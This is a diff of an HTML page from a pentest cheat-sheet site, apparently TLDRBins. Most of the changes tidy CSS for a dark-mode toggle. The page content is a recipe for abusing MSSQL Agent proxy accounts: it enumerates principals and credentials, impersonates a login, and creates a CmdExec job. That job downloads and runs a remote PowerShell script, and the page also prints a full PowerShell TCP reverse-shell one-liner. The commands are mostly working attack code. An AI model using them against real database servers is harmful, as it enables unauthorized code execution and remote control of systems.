@@ -44,16 +44,20 @@
 </div>
     
 <style>
+ 
 
  
+.js-toggle-wrapper, .js-toggle {
+    margin: 0;
+    padding: 0;
+    border: 0;
+    box-sizing: border-box;
+}
 
 .js-toggle-wrapper {
     display: table;
-
-     
     float: right;
     margin-left: auto;
-    margin-right: 0;
 }
 
 .js-toggle {
@@ -62,76 +66,60 @@
     position: relative;
     cursor: pointer;
     background-color: transparent;
-    border: 0;
-    padding: 0;
-    -webkit-touch-callout: none;
     user-select: none;
-    -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
-    -webkit-tap-highlight-color: transparent;
-  }
-  
-  .js-toggle-screenreader-only {
-    border: 0;
-    clip: rect(0 0 0 0);
-    height: 1px;
-    margin: -1px;
-    overflow: hidden;
-    padding: 0;
+}
+
+.js-toggle-screenreader-only {
     position: absolute;
     width: 1px;
-  }
-  
-  .js-toggle-track {
+    height: 1px;
+    margin: -1px;
+    padding: 0;
+    overflow: hidden;
+    clip: rect(0, 0, 0, 0);
+}
+
+.js-toggle-track {
     width: 50px;
     height: 24px;
-    padding: 0;
     border-radius: 30px;
     background-color: hsl(223, 61%, 44%);
-    transition: all 0.2s ease;
-  }
-  
-  .js-toggle-track-check {
-    position: absolute;
-    width: 17px;
-    height: 17px;
-    left: 5px;
-    top: 0px;
-    bottom: 0px;
-    margin-top: auto;
-    margin-bottom: auto;
-    line-height: 0;
-    opacity: 0;
-    transition: opacity 0.25s ease;
-  }
-  
-  .js-toggle--checked .js-toggle-track-check {
-    opacity: 1;
-    transition: opacity 0.25s ease;
-  }
+    transition: background-color 0.2s ease;
+}
 
-  .js-toggle--checked .js-toggle-track {
-    background-color: hsl(222, 14%, 7%);
-  }
-  
-  .js-toggle-track-x {
+.js-toggle-track-check,
+.js-toggle-track-x {
     position: absolute;
     width: 17px;
     height: 17px;
-    right: 5px;
-    top: 0px;
-    bottom: 0px;
-    margin-top: auto;
-    margin-bottom: auto;
-    line-height: 0;
-    opacity: 1;
+    top: 50%;
+    transform: translateY(-50%);
     transition: opacity 0.25s ease;
-  }
-  
-  .js-toggle--checked .js-toggle-track-x {
+}
+
+.js-toggle-track-check {
+    left: 5px;
     opacity: 0;
-  }
-  
-  .js-toggle-thumb {
+}
+
+.js-toggle--checked .js-toggle-track-check {
+    opacity: 1;
+}
+
+.js-toggle-track-x {
+    right: 5px;
+    opacity: 1;
+}
+
+.js-toggle--checked .js-toggle-track-x {
+    opacity: 0;
+}
+
+.js-toggle--checked .js-toggle-track {
+    background-color: hsl(222, 14%, 7%);
+}
+
+.js-toggle-thumb {
     position: absolute;
     top: 1px;
     left: 1px;
@@ -139,15 +127,12 @@
     height: 22px;
     border-radius: 50%;
     background-color: #fafafa;
-    box-sizing: border-box;
-    transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1) 0ms;
-    transform: translateX(0);
-  }
-  
-  .js-toggle--checked .js-toggle-thumb {
+    transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+}
+
+.js-toggle--checked .js-toggle-thumb {
     transform: translateX(26px);
-    border-color: #19ab27;
-  }
+}
 </style>
 
 <script>
@@ -176,7 +161,6 @@
         switcher.classList.add('js-toggle--checked');
         body.classList.add('dark-mode');
     }
-
 </script>
   <p class="desc"></p>
 </header>
@@ -197,7 +181,7 @@
 </ul>
 <hr>
 <div class="content">
-<div id="dynamicFormContainer">
+  <div id="dynamicFormContainer">
 	<form id="dynamicForm" style="display: none;">
 	</form>
 	<div class="buttons center">
@@ -337,11 +321,8 @@ body.dark-mode #dynamicFormContainer button:hover {
     cursor: pointer;
     background: #424242;
 }
-
-
 </style>
-<h3 id="1-pre-check">1. Pre-check</h3>
-<div>
+  <h3 id="1-pre-check">1. Pre-check</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> List principals
 </span></span><span class="line"><span class="cl"><span class="go">SELECT name FROM sys.database_principals;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check privilege over a principal from current user
@@ -350,26 +331,19 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span><span class="line"><span class="cl"><span class="go">SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions(&#39;&lt;PRINCIPAL&gt;&#39;, &#39;USER&#39;);
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check SQL credentials
 </span></span><span class="line"><span class="cl"><span class="go">SELECT name, credential_identity FROM sys.credentials;
-</span></span></span></code></pre></div></div>
-<h3 id="2-check-proxy-account-name-and-permissions">2. Check proxy account name and permissions</h3>
-<div>
+</span></span></span></code></pre></div><h3 id="2-check-proxy-account-name-and-permissions">2. Check proxy account name and permissions</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Create a table to store info
 </span></span><span class="line"><span class="cl"><span class="go">CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255));
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Insert proxy info into table
 </span></span><span class="line"><span class="cl"><span class="go">EXECUTE AS LOGIN=&#39;&lt;PRINCIPAL&gt;&#39;; INSERT proxies EXEC msdb.dbo.sp_enum_proxy_for_subsystem;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Show proxy info
 </span></span><span class="line"><span class="cl"><span class="go">SELECT subsystem_name, proxy_name FROM proxies;
-</span></span></span></code></pre></div></div>
-<h3 id="3-create-agent-job">3. Create agent job</h3>
+</span></span></span></code></pre></div><h3 id="3-create-agent-job">3. Create agent job</h3>
 <h4 id="powershell-2">Powershell #2</h4>
-<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">&#39;&lt;LOCAL_IP&gt;&#39;</span>,&lt;LOCAL_PORT&gt;<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span> <span class="o">=</span> 0..65535<span class="p">|</span>%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, 0, <span class="nv">$bytes</span>.Length<span class="o">))</span> -ne 0<span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">&#39;PS &#39;</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
-</span></span></code></pre></div></div>
-<h4 id="create-job">Create job</h4>
-<div>
+</span></span></code></pre></div><h4 id="create-job">Create job</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">USE msdb; EXEC AS LOGIN=&#39;&lt;PRINCIPAL&gt;&#39;; EXEC dbo.sp_add_job @job_name=N&#39;ANYTHING&#39;; EXEC dbo.sp_add_jobserver @job_name=N&#39;ANYTHING&#39;; EXEC dbo.sp_add_jobstep @job_name = N&#39;ANYTHING&#39;, @step_name=N&#39;ExecPayload&#39;, @subsystem=N&#39;CmdExec&#39;, @command=&#39;powershell.exe iex(iwr http://&lt;LOCAL_IP&gt;/shell.ps1)|iex&#39;, @retry_attempts=5, @retry_interval=5, @proxy_name=N&#39;&lt;PROXY_NAME&gt;&#39;; EXEC dbo.sp_start_job @job_name = N&#39;ANYTHING&#39;;
-</span></span></span></code></pre></div></div>
-<br>
+</span></span></span></code></pre></div>
 </div></div>
     
     <script src="/js/utils.js"></script>
@@ -377,8 +351,6 @@ body.dark-mode #dynamicFormContainer button:hover {
     <hr>
     <div class="footer-text">
         <div>© 2024 TLDRBins</div>
-        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
-                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
     </div>
 </footer>
 </body>
